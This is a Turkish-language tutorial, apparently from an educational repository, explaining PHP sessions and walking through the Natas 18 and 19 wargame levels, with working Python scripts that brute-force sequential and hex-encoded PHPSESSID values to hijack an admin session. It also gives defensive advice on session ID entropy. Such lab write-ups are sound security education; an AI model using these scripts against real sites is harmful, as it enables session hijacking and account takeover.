# 🌐 Web Güvenliği — Session Brute-Force

> Sunucu her kullanıcıya bir session ID verir ve "sen kimsin?" diye sorarken
> bu ID'ye bakar. Peki ID tahmin edilebilirse?

---

## 📋 İçindekiler

- [Session Nedir?](#session-nedir)
- [PHPSESSID Nasıl Çalışır?](#phpsessid-nasıl-çalışır)
- [Tahmin Edilebilir Session ID](#tahmin-edilebilir-session-id)
- [Session Brute-Force](#session-brute-force)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Session Nedir?

HTTP stateless'tır — sunucu her isteği bağımsız değerlendirir. Session mekanizması bu sorunu çözer:

```
1. Kullanıcı giriş yapar
2. Sunucu rastgele bir session ID üretir
3. Bu ID cookie olarak tarayıcıya verilir: Set-Cookie: PHPSESSID=abc123
4. Kullanıcı her istekte bu ID'yi gönderir: Cookie: PHPSESSID=abc123
5. Sunucu ID'ye bakarak "bu kullanıcı giriş yapmış" der
```

Session verisi **sunucuda** saklanır (dosya, veritabanı, memory). Cookie sadece anahtarı taşır.

```
Tarayıcı                    Sunucu
  PHPSESSID=abc123   →      /tmp/sess_abc123 dosyasına bak
                            username=admin
                            isloggedin=true
```

---

## PHPSESSID Nasıl Çalışır?

PHP varsayılan olarak session ID'leri `/tmp/sess_[ID]` şeklinde dosyalarda saklar.

```php
session_start();                    // Session başlat
$_SESSION['user'] = 'admin';        // Session'a veri yaz
echo session_id();                  // Mevcut session ID'yi göster
```

Güvenli bir session ID şöyle görünür:

```
PHPSESSID=4f3c2b1a9e8d7f6a5b4c3d2e1f0a9b8c   ← 128-bit rastgele
```

Güvensiz (tahmin edilebilir):

```
PHPSESSID=1
PHPSESSID=2
PHPSESSID=100
PHPSESSID=admin1
```

---

## Tahmin Edilebilir Session ID

Natas 18 ve 19'da session ID'ler tahmin edilebilir aralıktadır.

### Natas 18 — Sıralı Sayısal ID

```php
$maxid = 640;   // Maksimum session ID

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
        return 1;
    }
    return 0;
}

session_id(my_session_id());   // Özel session ID atama
session_start();

if(isValidAdminLogin()) {
    $_SESSION['admin'] = 1;
}
```

Session ID 1 ile 640 arasında. Admin herhangi bir zamanda giriş yapmışsa, o session hâlâ aktif olabilir.

### Natas 19 — Encode Edilmiş ID

```
Normal:   PHPSESSID=1
Natas 19: PHPSESSID=3135352d61646d696e   ← hex encode edilmiş "155-admin"
```

Format: `[sayı]-[kullanıcıadı]` → hex encode

`admin` kullanıcısı için denenmesi gereken ID'ler:
```
1-admin   → hex → 312d61646d696e
2-admin   → hex → 322d61646d696e
...
640-admin → hex → 3634302d61646d696e
```

---

## Session Brute-Force

Tüm olası session ID'lerini deneyerek geçerli bir admin session'ı bulmak.

### Temel Mantık

```python
for session_id in range(1, 641):
    response = requests.get(url, cookies={"PHPSESSID": str(session_id)}, auth=...)
    if "Password" in response.text:   # admin session bulundu
        print(f"Admin session ID: {session_id}")
        break
```

### Natas 18 için Python

```python
import requests

url      = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
password = "[natas18_şifresi]"

for session_id in range(1, 641):
    r = requests.get(
        url,
        cookies={"PHPSESSID": str(session_id)},
        auth=(username, password)
    )
    if "You are an admin" in r.text:
        print(f"[✓] Admin session ID bulundu: {session_id}")
        print(r.text)
        break

    if session_id % 50 == 0:
        print(f"[*] {session_id}/640 denendi...")
```

### Natas 19 için Python

```python
import requests

url      = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "[natas19_şifresi]"

for i in range(1, 641):
    # "i-admin" → hex encode
    raw = f"{i}-admin"
    hex_id = raw.encode().hex()

    r = requests.get(
        url,
        cookies={"PHPSESSID": hex_id},
        auth=(username, password)
    )
    if "You are an admin" in r.text:
        print(f"[✓] Bulundu! ID: {i}-admin → {hex_id}")
        print(r.text)
        break

    if i % 50 == 0:
        print(f"[*] {i}/640 denendi...")
```

---

## Natas'ta Kullanım

### Natas 18 — Sıralı PHPSESSID

**Kaynak kod (özet):**

```php
$maxid = 640;

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") { return 1; }
    return 0;
}

my_session_id() → 1 ile 640 arasında rastgele sayı seçiyor
```

**Exploit:** 1-640 arasındaki tüm session ID'leri dene. Herhangi birinde admin session varsa "You are an admin" mesajı gelir.

---

### Natas 19 — Hex Encoded Session ID

**Gözlem:** Cookie değeri hex görünüyor.

```bash
# Cookie decode et
echo "3331322d61646d696e" | xxd -r -p
# 312-admin
```

Format: `[sayı]-[kullanıcı]` hex encoded.

**Exploit:** `1-admin` ile `640-admin` arasındaki tüm kombinasyonları hex'e çevirip dene.

---

### Session Güvenliği — Doğru Yaklaşım

```
Güvensiz ✗                    Güvenli ✓
─────────────────────         ──────────────────────────
PHPSESSID=1,2,3...            Kriptografik rastgele ID
PHPSESSID=[kullanıcı_adı]     Opaque token (anlamsız)
Kısa/tahmin edilebilir        128+ bit entropi
Sonsuz geçerli               Süre sınırı + logout'ta sil
```

---

## 🔗 Kaynaklar

- [PortSwigger — Session Hijacking](https://portswigger.net/web-security/authentication/other-mechanisms)
- [OWASP — Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PHP — session_id()](https://www.php.net/manual/en/function.session-id.php)

---

**Önceki konu:** [13_command_injection_ileri.md](./13_command_injection_ileri.md)
**Sonraki konu:** [15_session_ve_newline_injection.md](./15_session_ve_newline_injection.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
